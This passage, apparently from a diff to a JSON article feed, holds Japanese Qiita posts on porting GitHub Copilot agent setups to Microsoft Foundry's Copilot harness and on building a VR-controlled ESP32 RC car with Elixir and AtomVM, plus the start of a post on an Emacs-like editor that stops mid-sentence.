searchツールを別途追加する必要があります）\n・サブエージェントへの委任\n\nここにスキルと、MCPなどのツールを足していきます。アプリケーションからは、ほかのPrompt agentと同じくResponses APIで呼び出せます。\n\n検証環境は以下のとおりです。\n・リージョン：Japan East\n・実装：Python SDK（azure-ai-projects>=2.9.0）\n・確認方法：レスポンスのイベントと、Application Insightsのトレース\n\nエージェント定義では、harness=MicrosoftCopilotHarness()を指定するだけです。\n\n [code] \n\nカスタムエージェントは、スキル＋サブエージェントで代替\n\nGitHub Copilotでは、.github/agents/edokko.agent.mdのようなカスタムエージェントを名前で呼び出せます。そこで、江戸っ子風と関西人風のエージェント定義を会話の作業領域に置き、名前を指定して呼んでみました。\n\n結果は、…\n名前付きのエージェントとしては呼び出せませんでした。\n\n公式ドキュメントでも、サブエージェントは「組み込みのサブエージェントに作業を任せる機能」として説明されています。本日時点で、.agent.mdのような独自のエージェント定義を登録する方法は見つかりませんでした。うーん残念。\n\nそこで、キャラクター設定をスキルとして登録し、組み込みのgeneral-purposeサブエージェントに「このスキルを読み込んで、その人物として動いて」と頼む方式にしました。スキルの中身はこんな感じです。\n\n [code] \n\n呼び出し方は、親エージェントのinstructionsに書いておきます（抜粋）。\n\n [code] \n\nすると親エージェントは、サブエージェント委任ツール（task）を次のように呼びました。トレースから取り出した実際の呼び出しです（プロンプトは親エージェント(Foundry)が自分で書いたもので、一部省略しています）。\n\n [code] \n\n「カスタムエージェント」を「組み込みサブエージェント＋スキル」に置き換えるのが、今回の落としどころです。なお、サブエージェントごとに異なるモデルを指定する方法も見つかりませんでした。そもそもFoundry本体側でモデルは指定されているので、できなそうです。\n\nスキルとリモートMCP(MS Learn MCP)は、そのまま動いた\n\nスキルは、SKILL.mdを含むフォルダをZIPにしてSkills APIに登録します。登録するとバージョンが付くので、そのバージョンをエージェントのskillsに指定します。\n\n [code] \n\nMCPは、エージェントのtoolsにMCPToolとして設定します。MS Learn MCPは認証が要らないので、URLを書くだけで使えました。\n\n [code] \n\nスキル本文にツール名を書いただけでは、当然MCPにはつながりません。toolsへの設定が必要です。\n\nAIたちに議論させてみた\n\nスキルとMCPを組み合わせて、Azure Functionsの.NET 11対応をお題に議論してもらいました。親エージェントは司会役で、次の4回をサブエージェントに任せます。\n\n \n\n1. 調査担当：MS Learn MCPで調べてまとめる\n2. 江戸っ子：調査結果を読んで、推奨と懸念を述べる\n3. 関西人：江戸っ子の意見に具体的に返す\n4. 江戸っ子：関西人の指摘を受けて、合意案を出す\n関西：江戸っ子さんの「既存isolatedから段階移行」には賛成やで。ただ、SDK移行でコード変更不要でも、アプリ全体の無改修までは保証せえへん。（中略）切り戻し手順を先に決めるのが運用条件や。\n江戸っ子：関西さんの「切り戻しを先に」に賛成だ。（中略）合意案はまず限定PoCよ。\n\n口調だけでなく、調査結果を踏まえて前の人の発言に反応しています。GitHub Copilotで作っていたAIチームの会議が、Foundryでも無事に再現できました。\n\n「実は親エージェントが一人でそれっぽく全部書いているのでは？」という疑いもあったので^^;、Application Insightsのトレースも確認しました。調査担当のサブエージェントの下で、Learn MCPが3回（検索2回、本文取得1回）呼ばれていたりきちんとサブエージェントを呼び出しているログも確認できました。実際の動きをトレースで確かめられるのも良いところです。\n\nplaywright-cliはsandboxで起動できなかった\n\nGitHub CopilotのAIチームでは、画面確認にplaywright-cliスキルを使っていました。このスキルも、変更せずに登録して実行させてみました。\n\nスキルは読み込めましたが、sandboxにNode.jsが入っていなかったので、playwright-cliコマンドを実行できない結果になりました。まぁそれはそうかなという予感はしていました。\n\n [code] \n\nそこであきらめずに、スキルに初期化スクリプトを足して、サブエージェント自身にNode.js、playwright-cli、Chromiumを入れてもらいました。結果インストールまではできましたが、ブラウザの起動時にOSのライブラリが足りずに失敗しました。\n\n [code] \n\nうーんあと少しなのに残念…！Copilot harnessのsandboxはサービスが管理していて、CPUやメモリ、ライフサイクルは変更できません（制限とクォータ）。OSのパッケージを追加する設定も今回は見つかりませんでした。また、ツールとスキルの使い方では、依存関係やランタイムを自分で管理したい場合はHosted agentを使うよう案内されています。けどなるべくマネージド環境を使いたいですよねぇ。\n\nスキルを読み込めても、スキルが使うコマンドが動くとは限りません。ローカルのCLIに頼るスキルは、Foundry側のツールに置き換える必要がありそうです。\n\nブラウザ操作はBrowser Automationで\n\nplaywright-cliスキルは使えませんでしたが、ブラウザを操作したい場合は、FoundryのBrowser Automationツールを使います。Copilot harness向けのクイックスタートが用意されています。\n\nBrowser Automationは、sandboxの中ではなく、Playwright Workspaceという別のAzureリソースが用意するクラウドのブラウザを使います。サブエージェントは、MCPを通してこのブラウザを操作します。準備したものは次のとおりです。\n\n1. Playwright Workspace\n2. FoundryプロジェクトのマネージドIDに、Playwright Workspaceを操作する権限\n3. Playwright Workspaceへの接続\n4. Browser Automationを入れたToolbox\n5. Toolboxへの接続\n\nクイックスタートの手順に沿って作れば特段つまるところなく作れました。\n\n試しにサブエージェントにWebサイトを開かせてみたところ、クラウドのブラウザでページを開き、見出しとURLを返してくれました。スクリーンショットの撮影も成功しましたが、画像はそのまま手元に届きませんでした。画像を受け取るには、Foundry Filesに保存して返すなど、別の仕組みと組み合わせる必要があります。\n\nWeb検索の出典を、サブエージェントに読みに行かせる\n\nFoundryのWeb Searchツールも色々とみてみました。Bingを使う検索ツールで、Bingのリソースは自分で作らなくても使えます（Grounding with Bing Searchツールとは別物です）。このツールは、検索結果をもとにまとめ済みの回答と出典リンクを返します。出典ページそのものの本文は返しません。\n\nそこで、Copilot harnessの組み込みツールで出典を読みに行かせました。スキルには次の手順を書いています。\n\n1. Web Searchで検索する\n2. 出典のURLを組み込みのURL取得ツール（webfetch）で開く\n3. PDFはwebfetchでテキスト化できないので、shellでcurlしてテキストを抜き出す\n4. 各主張に【本文確認済】【要約のみ】【食い違い】の印を付ける\n\nお題は「日本のスーパーでのお米の価格動向」です。トレースで確認すると、サブエージェントは以下のように動いていました。\n・農林水産省のページをwebfetchで開いた。本文が取れなかったので、HTMLをそのまま取得するモードに切り替え、リンク先のPDFのURLを見つけた\n・PDFはcurlでダウンロードできた。pdftotextは入っておらず、pip install pypdfでライブラリを入れて97ページ分のテキストを抜き出した\n・抜き出したテキストをgrepで絞り込み、必要な数値を読んだ\n【本文確認済】農水省の全国スーパー・生協等の平均は、税込5kg換算で2025年12月4,337円→2026年9月2,952円。9月は前年同月より29.5％安い。\n\nsandboxにはNode.jsがありませんでしたが、Python 3、pip、curlは使え、外部のサイトにもアクセスできました。Pythonで済む処理なら、その場でライブラリを入れて動かせます。\n\n現時点の制限\n\nプレビュー中なので、今後変わる可能性があります。詳しくは公式の制限ページを見てください。\n\n| 気になること | 答え |\n| --- | --- |\n| 今あるエージェントをCopilot harnessに変えられる？ | 変えられない。新しく作り直す |\n| どのモデルでも使える？ | 使えない。「推論」と「ツール呼び出し」の両方ができるモデルだけ。自分で持ち込んだモデル（BYOM）も不可。今回はgpt-6.1-solを使った |\n| 日本で使える？ | 使える。東日本（Japan East）を含む22リージョン |\n| sandboxのスペックやソフトは変えられる？ | 変えられない。CPU・メモリはサービス任せ。今回はNode.jsがなく、Python 3・pip・curlはあった |\n| ファイルは残る？ | 会話が変わると別の作業場所になる。残したい成果物はFoundry Filesに保存する |\n| Foundry Memoryは使える？ | 使えない（同じ会話内の履歴は使える） |\n| どうやって呼び出す？ | エージェントのエンドポイントに、毎回会話（conversation）を指定して送る |\n| 料金は？ | 2026年12月1日から、sandboxのCPUとメモリの使用量に応じた課金が始まる。モデルの利用料は別途かかる |\n| 長時間実行できる？ | 検証では4分程度は問題なく動いていましたが、公開された時間制限の記述はありませんでした。今後GAに向けて情報が出てくると思うので、要チェックです |\n\nGitHub CopilotのAIチームをFoundryに載せるなら\n\n今回やったことをまとめると以下の表になります。\n\n| GitHub Copilot | Foundry（Copilot harness） |\n| --- | --- |\n| copilot-instructions.md | エージェントのinstructions |\n| スキル | Skills APIに登録してskillsで紐づける |\n| カスタムエージェント | 組み込みサブエージェントに役割名を付け、人物設定や手順はスキルにする |\n| mcp.json | エージェントのtoolsにMCPを設定する |\n| playwright-cliなどのローカルCLI | Browser AutomationなどのFoundryのツールに置き換える |\n\n指示・スキル・MCPは、ほとんどそのまま使えます。書き換えが必要なのは、カスタムエージェントとローカルCLIの部分です。同じハーネスなのでそれはそうなのですが、Copilot harnessが結構柔軟に動いてくれるので少しの手間でGitHub CopilotのエージェントをFoundryで再現することができそうですね。\n\nまとめ\n\nGitHub Copilotと同じハーネスを、Foundryのマネージドなエージェントとして使えるようになりました。エージェントループもsandboxも自分で用意する必要がなく、スキルとMCPを持ち込めば、サブエージェントによる役割分担までできます。素晴らしいです。\n\nGitHub Copilotの構成をそのまま移すことはできませんが、カスタムエージェントはサブエージェントとスキルに、ローカルCLIはFoundryのツールに置き換えれば、大体同じことができそうです。GitHub Copilotで気軽に試してきたエージェントを、クラウドのエージェントとして動かす道が見えてきました。\n\n同じハーネスなので、GitHub Copilot側の改善がFoundryにも届くはずです。プレビューの今後に期待ですね。もしよければ是非色々試してみてください。\n\n参考\n・Introducing the Microsoft Copilot harness in Foundry Agent Service\n・Introducing the Microsoft Copilot harness（Microsoft公式ブログ）\n・Use the Microsoft Copilot harness with prompt agents\n・Copilot harness limits and availability\n・Browser Automation with the Copilot harness quickstart\n・Web Search tool",
+      "metrics": {
+        "likes": 1,
+        "stocks": 0,
+        "comments": 0
+      },
+      "sourceWeight": 3,
+      "lang": "ja",
+      "id": "63aa4c8e6ac3b1f8",
+      "foundIn": [
+        "qiita"
+      ],
+      "preScore": 0.8789930555555556,
+      "popularityPercentile": 0.9045138888888888,
+      "matchedTopics": [
+        "クラウド / 本番環境構築",
+        "AI支援開発・品質"
+      ],
+      "buzz": false,
+      "score": 84,
+      "titleJa": null,
+      "oneLiner": "GitHub CopilotのAIチームはFoundryのCopilot harness上で一部置き換えを伴いながら動作した。",
+      "takeaways": [
+        "GitHub Copilotの作業方式をFoundryで動かせた。",
+        "独自の担当役は組み込みの担当機能に置き換えた。",
+        "手元のCLIはMicrosoftのブラウザー操作機能に置き換えた。"
+      ],
+      "keywords": [
+        "Microsoft Copilot harness",
+        "Microsoft Foundry",
+        "Foundry Agent Service",
+        "GitHub Copilot CLI",
+        "MCP",
+        "Browser Automation"
+      ],
+      "category": "AI/エージェント",
+      "lane": "build",
+      "readingMinutes": 8,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "qiita",
+      "sourceLabel": "Qiita",
+      "title": "XRift x AtomVM x Elixirで作るVRラジコン",
+      "url": "https://qiita.com/t-yamanashi/items/1d8b9750656a5b8b2a5b",
+      "publishedAt": "2026-11-19T14:50:48.000Z",
+      "author": "ymn",
+      "authorDetail": {
+        "name": "ymn",
+        "handle": "@t-yamanashi",
+        "url": "https://qiita.com/t-yamanashi",
+        "avatarUrl": "https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/295814/profile-images/1735609883",
+        "bio": "よく使うもの:　Elixir/Ubuntu/Resonite \r\ngithubのid変えました \r\n記事が古い場合は置き換えて読んでください\r\n\r\n2023/9月にくも膜下出血で手術しました\r\n脳障害（失語症）になりリハビリ感覚で書いてます\r\n\r\nElixir関連の仕事があったらXのDMから声をかけてもらえたら嬉しいな",
+        "organization": "ymnbuild（フリーランス）",
+        "location": "静岡",
+        "followers": 29,
+        "posts": 215,
+        "links": [
+          {
+            "label": "GitHub",
+            "url": "https://github.com/ymn-t-yamanashi"
+          },
+          {
+            "label": "X",
+            "url": "https://x.com/dgx_elixir"
+          },
+          {
+            "label": "Web",
+            "url": "https://github.com/ymn-t-yamanashi"
+          }
+        ]
+      },
+      "tags": [
+        "XRift",
+        "Elixir",
+        "AtomVM",
+        "websocket",
+        "codex"
+      ],
+      "snippet": "はじめに VR空間の中にラジコンの運転席を作り、席に座ってWASDやカーソル操作で実機を動かすラジコンを作りました。 このプロジェクトのプログラムは、OpenAI CodexでGTP-5.6 Luna xhighを使って作成しています。 この記事も、CodexでGTP-5.6 Luna xhighを使った対話を通じて構成・執筆しています。 構成は、次の3つのプロジェクトに分けています。 ・XRiftワールド：VR内の運転席と操作UI ・Elixir製WebSocketサーバー：XRiftとマイコンの中継 ・AtomVM/Elixirファームウェア：XIAO ESP32-S3でGPIOを制御 この記事では、部品の接続からWi-Fi設定、WebSocket通信、VR操作までを順番に説明します。 完成品 完成したラジコンの動作は、次のX投稿で紹介しています。 https://x.com/dgxe…",
+      "body": "はじめに\n\nVR空間の中にラジコンの運転席を作り、席に座ってWASDやカーソル操作で実機を動かすラジコンを作りました。\n\nこのプロジェクトのプログラムは、OpenAI CodexでGTP-5.6 Luna xhighを使って作成しています。\nこの記事も、CodexでGTP-5.6 Luna xhighを使った対話を通じて構成・執筆しています。\n\n構成は、次の3つのプロジェクトに分けています。\n・XRiftワールド：VR内の運転席と操作UI\n・Elixir製WebSocketサーバー：XRiftとマイコンの中継\n・AtomVM/Elixirファームウェア：XIAO ESP32-S3でGPIOを制御\n\nこの記事では、部品の接続からWi-Fi設定、WebSocket通信、VR操作までを順番に説明します。\n\n完成品\n\n完成したラジコンの動作は、次のX投稿で紹介しています。\n\nhttps://x.com/dgxelixir/status/2122728356865278273\n\n完成した構成\n\n最終的な通信経路は次のとおりです。\n\n [code] \n\nプロジェクトはGitHubで公開しています。\n・atomvm-rc-car\n・rc-ws-server\n・rc-world\n\n各技術の役割\n\n各技術の説明\n\nXRift\nXRiftは、WebXR対応の3D空間を作るプラットフォームです。\n本記事では、運転席・操作パネル・カメラモニターをワールド内に配置します。\n座席への着席状態とWASDやカーソル入力を使ってラジコンを操作します。\nXRift公式ドキュメント\n\nAtomVM\nAtomVMは、BEAM系のコードをマイコン上で動かす実行環境です。\n本記事ではElixirファームウェアをXIAO ESP32-S3で実行します。\nWi-Fi、WebSocket、GPIOを担当し、受信した命令をモータードライバーへ出力します。\nAtomVM公式ドキュメント\n\nElixir\nElixirは、Erlang VM上で動作する並行処理向けの言語です。\n本記事では、AtomVM側のファームウェアとPC側のWSサーバーに使います。\nプロセスとパターンマッチを利用して、接続や切断を扱いやすくします。\nElixir公式サイト\n\nWebSocket\nWebSocketは、接続を維持したまま双方向にデータを送れる通信方式です。\nXRiftとPC、PCとマイコンの間で操作命令と状態をリアルタイムに交換します。\n接続切断時には停止命令を送るなど、安全側へ戻す処理も組み込みます。\nMDN WebSocket API\n\nVDO.Ninja\nVDO.Ninjaは、ブラウザーのカメラ映像をWebRTCで共有できるサービスです。\n本記事では、カメラ映像をrc-worldの3Dモニターへ表示するために使います。\nラジコン操作用のWebSocketとは分離しているため、映像だけを独立して確認できます。\nVDO.Ninja公式サイト\n使用した部品\n・Seeed Studio XIAO ESP32-S3\n・Grove Shield for XIAO\n・L298Nモータードライバー\n・F130 DCモーター 2個\n・モーター用電源\n・USB-Cケーブル\n・ラジコン用シャーシと車輪\n\nXIAO ESP32-S3とGrove Shieldについては、次の資料を参考にしました。\n・XIAO ESP32-S3 Getting Started\n・Grove Shield for Seeeduino XIAO\n\nモータードライバーの配線\n\n今回はL298Nの2系統を、左モーターと右モーターに1系統ずつ割り当てました。\n\n| XIAO / Grove Shield | L298N |\n|---|---|\n| D0 / GPIO1 | IN1 |\n| D1 / GPIO2 | IN2 |\n| D2 / GPIO3 | IN3 |\n| D5 / GPIO6 | IN4 |\n| GND | GND |\n\nモーターは次のように接続します。\n\n [code] \n\nモーター用電源には単三電池4本を接続し、Grove Shieldからは取らず、L298Nへ別に接続します。XIAOとL298NのGNDは共通にします。\n\nL298Nと3Vモーターの注意点\n\nESP32-S3の5V端子とL298Nの5V端子を接続し、L298Nのロジック電源として使用しています。L298Nの5V端子はモーター用電源ではないため、モーター電源は別系統から供給します。\n\nモーターの制御値\n\n左右のモーターは、次のJSONメッセージで制御します。\n\n [code] \n\n値の意味は次のとおりです。\n・1：前進\n・-1：後退\n・0：停止\n\n例えば、前進・後退・旋回は次のように表現できます。\n\n| 操作 | left | right |\n|---|---:|---:|\n| 前進 | 1 | 1 |\n| 後退 | -1 | -1 |\n| 左旋回 | -1 | 1 |\n| 右旋回 | 1 | -1 |\n| 停止 | 0 | 0 |\n\nAtomVMファームウェア\n\nマイコン側は、専用のElixirプロジェクトであるatomvm-rc-carを使います。\n\n主な役割は次のとおりです。\n・Wi-Fiへ接続する\n・WebSocketサーバーへ接続する\n・motorsetを受信する\n・GPIO1、GPIO2、GPIO3、GPIO6を切り替える\n・接続失敗時や切断時にモーターを停止する\n\nGPIOは、L298NのIN1〜IN4へ接続しています。モーターへGPIOから直接電力を供給することはありません。\n\nビルド\n\n [code] \n\nAtomVMのESP32-S3用イメージを書き込んだ後、アプリケーションを書き込みます。\n\n [code] \n\nWi-Fi設定とNVS\n\nWi-FiのSSID、パスワード、WSサーバーのアドレスは、ソースコードへ埋め込まず、USBシリアルから入力します。\n\n入力した値はESP32のNVS（Non-Volatile Storage）へ保存します。NVSはESP32内蔵フラッシュを使った不揮発性のキー・バリュー保存領域です。\n\nそのため、通常の再起動や電源OFFでは設定が消えず、次回起動時に自動的に読み出されます。\n\n設定変更時は、USBシリアルで次のように入力します。\n\n [code] \n\n起動後5秒以内に、次を入力します。\n\n [code] \n\n続けて、次の値を入力します。\n\n [code] \n\nパスワードはGitHubへ保存されません。ただし、NVSの内容はアプリ側で暗号化していないため、実機を物理的に読み取られる可能性がある場合は注意が必要です。\n\n設定後のログは次のようになります。\n\n [code] \n\nElixir製WebSocketサーバー\n\nrc-ws-serverはPC上で動作するElixir製のWebSocketサーバーです。Cowboyを使い、/wsエンドポイントでクライアントを受け付けます。\n\n主な役割は、XRiftとAtomVMの間でメッセージを中継することです。サーバー自身がモーターを制御するのではなく、受信したメッセージを別のクライアントへ渡します。\n\n起動\n\n [code] \n\n開発時の接続先は次の形式です。\n\n [code] \n\n同じPCのブラウザーで確認する場合は、localhostを使えます。別のVR端末から接続する場合は、localhostではなくPCのLAN側IPを指定します。\n\nXRiftワールド\n\nrc-worldは、XRift内にラジコン用の席と操作パネルを表示するプロジェクトです。\n\n席に座っている間だけ、WASDまたはカーソル操作をラジコン命令として扱います。\n\n画面には次の情報を表示します。\n・WS接続状態\n・車体接続状態\n・着席状態\n・現在の操作指示\n・左右モーターの状態\n・入力元\n\nWS接続先は、VITERCWSURLで指定します。\n\n同じPCでローカル確認する場合は、次のように起動できます。\n\n [code] \n\n別のVR端末から同じLAN経由で接続する場合は、PCのLAN側IPを指定し、開発サーバーもLANから接続できるように起動します。\n\n [code] \n\nワールドでカメラ映像を表示する\n\nこのワールドでは、カメラ映像をVDO.NinjaからWebRTCで受信し、空間内の3Dモニターへ表示します。\n\n今回のカメラ映像の経路は、ラジコン操作用のWebSocketとは別です。\n\n [code] \n\nつまり、カメラ映像はrc-ws-serverやAtomVMを経由しません。WSサーバーが停止していても、VDO.Ninjaの映像受信だけを確認できます。\n\n配信側の準備\n\nカメラを接続したPCやスマートフォンでVDO.Ninjaを開き、カメラ映像を配信します。配信側で作成した視聴用URLを使います。\n\n視聴用URLは、次のようにviewを含む形にします。\n\n [code] \n\n実際の記事や公開リポジトリには、個人用のVIEWID、ルーム名、パスワードを掲載しません。\n\nワールド側で接続する\n\n1. XRiftワールド内の「VDO.Ninja 視聴URL」入力欄を選択する\n2. VDO.Ninjaの視聴用URLを入力する\n3. 「VDO.Ninjaに接続」を選択する\n4. 3Dモニターに「映像を受信中」と表示されることを確認する\n\nローカル開発ではブラウザーの入力ダイアログを使い、XRift上ではTextInputを使います。ワールドはURLからview、room、passwordを読み取り、VDO.Ninja SDKへ渡します。\n\n受信処理では、音声を無効にした状態で映像だけを取得し、HTMLVideoElementをThree.jsのVideoTextureへ変換して3Dモニターのマテリアルへ設定します。\n\nXRiftの権限設定\n\nVDO.NinjaのWebRTC接続に必要なドメインを、xrift.jsonのpermissions.allowedDomainsへ追加しています。\n\n [code] \n\n映像が表示されない場合\n・視聴用URLにviewが含まれているか確認する\n・配信側のカメラが動作しているか確認する\n・ルーム名とパスワードが一致しているか確認する\n・XRiftへ公開する場合はHTTPS環境を使う\n・ワールドの表示が「映像を受信中」になるまで待つ\n\nこの初期実装では、単一の視聴映像を受信し、音声は受信しません。\n動作確認\n\n次の順番で確認します。\n\n1. WSサーバーを起動する\n2. AtomVMを起動する\n3. AtomVMのログでWi-Fi接続を確認する\n4. WebSocket connectedを確認する\n5. XRiftワールドを起動する\n6. ラジコン席に座る\n7. W/A/S/Dまたはカーソルボタンを操作する\n8. モーターの状態表示と実機の動作を確認する\n\nワールド側で車体: 未接続と表示されている場合、WSサーバーは起動していてもマイコンが接続できていません。この状態では、安全のため操作ボタンとキー入力を無効にしています。\n\nトラブルシューティング\n\nWi-Fiは接続できるがWebSocketに接続できない\n\nマイコンが保存しているWSサーバーのアドレスを確認します。PCのIPアドレスが変わった場合は、NVSの設定を再入力します。\n\nマイコンから見たlocalhostはマイコン自身を意味するため、PC上のWSサーバーへ接続する場合はPCのLAN側IPを入力します。\n\nWキーを押してもワールドの表示が変わらない\n\n次の3条件を確認します。\n・ラジコン席に着席している\n・WS接続が確立している\n・車体が接続済みになっている\n\nこのワールドでは、車体未接続時にモーター命令を送らない安全設計にしています。\n\nモーターが回らない\n・L298NのGNDとXIAOのGNDが共通か確認する\n・モーター電源をGrove Shieldから取っていないか確認する\n・L298Nの電源端子とモーター電圧を確認する\n・F130とL298Nの電圧降下を確認する\n・まずモーターの代わりにLEDなどでGPIO出力を検証する\n\nセキュリティと運用上の注意\n\n今回の初期構成は、信頼できる同一LAN内での開発を前提にしています。\n・開発時はws://を使用する\n・外部公開時はリバースプロキシでTLS終端し、XRiftからはwss://を使用する\n・WSサーバーに認証を追加するまで、インターネットへ直接公開しない\n・SSID、パスワード、個人のIPアドレスをソースや記事へ掲載しない\n・GPIOからモーターへ直接給電しない\n\n今後の改善\n\n今後は次の改善を予定しています。\n・TB6612FNGまたはDRV8833への変更\n・PWMによる速度制御\n・WebSocketの認証\n・WSS対応\n・バッテリー電圧の監視\n・モーターや車体の状態表示\n\nまとめ\n\nXRift、Elixir、AtomVMを組み合わせることで、VR空間の操作UIと実機のGPIO制御をWebSocketで接続できました。\n\n3つのプロジェクトを分離したことで、次のような構成になっています。\n・XRiftは操作画面に集中する\n・Elixirは通信中継に集中する\n・AtomVMはマイコンとGPIO制御に集中する\n\nVR側の表示、サーバー側の通信、マイコン側のハードウェア制御を分離できるため、今後のモータードライバー変更や操作方法の追加にも対応しやすい構成です。",
+      "metrics": {
+        "likes": 1,
+        "stocks": 0,
+        "comments": 0
+      },
+      "sourceWeight": 3,
+      "lang": "ja",
+      "id": "9770ca77124afb78",
+      "foundIn": [
+        "qiita"
+      ],
+      "preScore": 0.5803125,
+      "popularityPercentile": 0.9635416666666666,
+      "matchedTopics": [
+        "AI支援開発・品質"
+      ],
+      "buzz": false,
+      "score": 84,
+      "titleJa": null,
+      "oneLiner": "Codexを使ってVR空間から実機を操作するラジコンをXRiftとElixirで構築した。",
+      "takeaways": [
+        "VR空間の運転席から実機のラジコンを動かせる。",
+        "VR画面と機体は無線通信でつながっている。",
+        "3つの小さなプログラムに分けて全体を構成している。"
+      ],
+      "keywords": [
+        "XRift",
+        "AtomVM",
+        "Elixir",
+        "WebSocket",
+        "OpenAI Codex",
+        "XIAO ESP32-S3"
+      ],
+      "category": "設計・実装ノウハウ",
+      "lane": "build",
+      "readingMinutes": 12,
+      "payoff": "apply",
+      "durability": "durable",
+      "tryPrompt": null
+    },
+    {
+      "source": "qiita",
+      "sourceLabel": "Qiita",
+      "title": "Emacsが好きすぎて、Emacs風のエディタ「elecxzy」を作りました",
+      "url": "https://qiita.com/kurouna/items/2ad019a468ebad6711a2",
+      "publishedAt": "2026-11-19T11:47:54.000Z",
+      "author": "kurouna",
+      "authorDetail": {
+        "name": "kurouna",
+        "handle": "@kurouna",
+        "url": "https://qiita.com/kurouna",
+        "avatarUrl": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/4534745/9caf104bee10f55ae6a96ea7a8f185b7a13d263d/large.png?1795015333",
+        "followers": 0,
+        "posts": 3,
+        "links": [
+          {
+            "label": "Web",
+            "url": "https://github.com/kurouna/"
+          }
+        ]
+      },
+      "tags": [
+        "Emacs",
+        "Electron",
+        "TypeScript",
+        "個人開発",
+        "MCP"
+      ],
+      "snippet": "はじめに Emacsが今年で50周年だそうです。おめでとうございます。 私は社会人になって最初に触ったエディタがEmacsで、その後Windowsではxyzzyを長く使ってきました。xyzzyの更新が止まってからもあの操作感が忘れられず、Electron + React + TypeScriptでEmacs風のエディタ「elecxzy」を作っています。Windows向けで、いまのバージョンは0.25.0です。 この記事では、Emacs好きの目線でelecxzyのどこがEmacsっぽいのかを紹介します。動いているところは、こちらの動画で見られます。 Lispは載せていません 最初に断っておくと、elecxzyにはEmacs Lispがありません。init.elを育てる楽しさは分かっているつもりですが、elecxzyは「インストールした直後から手に馴染む」ことを優先しました。よく使う機能は最初…",
+      "body": "はじめに\n\nEmacsが今年で50周年だそうです。おめでとうございます。\n\n私は社会人になって最初に触ったエディタがEmacsで、その後Windowsではxyzzyを長く使ってきました。xyzzyの更新が止まってからもあの操作感が忘れられず、Electron + React + TypeScriptでEmacs風のエディタ「elecxzy」を作っています。Windows向けで、いまのバージョンは0.25.0です。\n\nこの記事では、Emacs好きの目線でelecxzyのどこがEmacsっぽいのかを紹介します。動いているところは、こちらの動画で見られます。\n\n \n\nLispは載せていません\n\n最初に断っておくと、elecxzyにはEmacs Lispがありません。init.elを育てる楽しさは分かっているつもりですが、elecxzyは「インストールした直後から手に馴染む」ことを優先しました。よく使う機能は最初から入れておき、変えたいところはM-xのコマンドか設定サイドバーから変えられるようにして、JSONに保存しています。\n\nキーバインドはEmacsとほぼ同じにしていますが、自分の手に馴染んだキーに変えたいときは、M-x show-keybinds-configで開くJSONファイルでカスタマイズできます。書き方はEmacsの記法に寄せています。\n\n [code] \n\n指が覚えているキーがそのまま動く\n\nC-nやC-f、C-kとC-y、C-sといった基本の操作に限らず、elecxzyには300を超えるコマンドがあり、Emacsにあるものはできるだけ同じキー、同じ名前、同じ動きになるように作っています。キルリング、マーク、レジスタ、矩形編集、キーボードマクロ、C-uの前置引数もEmacsと同じように使えます。\n\nElectronでこれをやろうとすると、CtrlやAltの組み合わせをメインプロセスのbefore-input-eventで先に取らないとブラウザ側のショートカットに食われる、日本語IMEがC-xの直後の入力を持っていってしまう、といった細かい問題に当たりましたが、慣れ親しんだEmacsの操作を再現するために1つずつ潰していきました。\n\n一方で、Windowsならではの便利さも取り入れています。ファイルはEmacsと同じくミニバッファで開いたり保存したりできますが、C-x M-f／C-x M-wではWindowsのファイルダイアログを出せるので、ネットワークドライブなどにも保存しやすくしています。\n\nミニバッファ\n\nM-xはミニバッファから補完付きで実行します。コマンド名を覚えていないときはM-h（apropos-command）で、語がコマンド名か説明に一致するコマンドをキーバインド付きで一覧できます。\n\n \nM-x previewまで打ったところ\n\nM-s l（consult-line）は、空白で区切った語をすべて含む行に絞り込みます。orderlessのような使い心地にしたくて、語の順番は問わないようにしました。\n\nウィンドウ分割とwinner-mode\n\nC-x 2、C-x 3で分割、C-x oで移動、C-x 0とC-x 1で閉じる、という流れはEmacsのままです。分割は入れ子にできて、ペインの並びは木で持っています。\n\n \nシェル、Markdownのプレビュー、コードを並べたところ（Tokyo Nightテーマ）\n\nwinner-modeに当たる機能は最初から有効で、C-c ／C-c で分割やサイズ変更を取り消せます。Emacs 31.1で入ったレイアウトの操作にも対応していて、C-x w tで縦横を入れ替えたり、C-x w rで90°回したり、C-x w f／C-x w vで左右・上下を反転したりできます。\n\nhttps://x.com/elecxzy/status/2090067418626527270\n\nEmacsの新しめのバージョンで入った機能は、ほかにも気に入ったものから取り込んでいます。29.1のduplicate-dwim、30.1のcompletion-preview-modeとkill-ring-deindent-mode、31.1のkill-region-dwimなどです（既定ではOFFのものもあります）。\n\nサイドバー\n\nEmacsではbrowse-kill-ringのように専用のバッファを開くところを、elecxzyではサイドバーにしています。左側にファイラ（C-x d）があり、右側には次のサイドバーがあります。どれもキーボードだけで操作できます。\n・ワークスペース（C-c w）: 複数のフォルダをまとめて開きます。VS Codeの.code-workspaceも読み書きできます\n・設定（C-c s）: フォント、テーマ、行番号などを一覧から変えられます\n・キルリング（C-c y）、レジスタ（C-c r）、Undo履歴（C-c u）\n・アウトライン（C-c o）: Markdownの見出しや、コードの関数・クラスの階層を表示します\n・Git（C-c g）: 変更の一覧とコミットの履歴を見て、コミットやpushもできます\n\n \nキルリングのサイドバー。選んだ項目をヤンクできます\n\n \nGitのサイドバー\n\nAI連携\n\nこのアドベントカレンダーの紹介文に「AI時代だからこそEmacsは最強」とありましたが、elecxzyもAIと連携できます。\n\nVS CodeなどのエディタはMCPサーバーを使う側ですが、elecxzyは逆に自分がMCPサーバーになります。M-x mcp-startでサーバーを立てておくと、Claude DesktopやClaude CodeなどのAIエージェントから、バッファの読み書き、カーソル移動、ウィンドウ分割などを操作できます。保存できるディレクトリは設定で許可したものに限っています。\n\nhttps://x.com/elecxzy/status/2057886459122548947\n\nエディタ側からAIのCLIを呼ぶこともできます。M-x claude-cli（codex-cli、antigravity-cliもあります）は、選択範囲と指示文をCLIに渡し、答えを隣のペインに表示します。C-uを付けると答えで選択範囲を置き換えるので、文章を選んで「英語にして」と頼めばその場で書き換わり、C-/1回で元に戻せます。\n\n自作だから入れられたもの\n\n自作のエディタのよいところは、自分が欲しいものを好きなだけ作り込めることです。Emacsならパッケージを探して設定するところを、elecxzyでは本体に直接入れてしまえます。その中から2つ紹介します。\n\n同梱のMozc\n\n日本語入力では、WindowsのMS-IMEとスムーズに連携できるよう細かく制御しています。さらに最近は、「Google 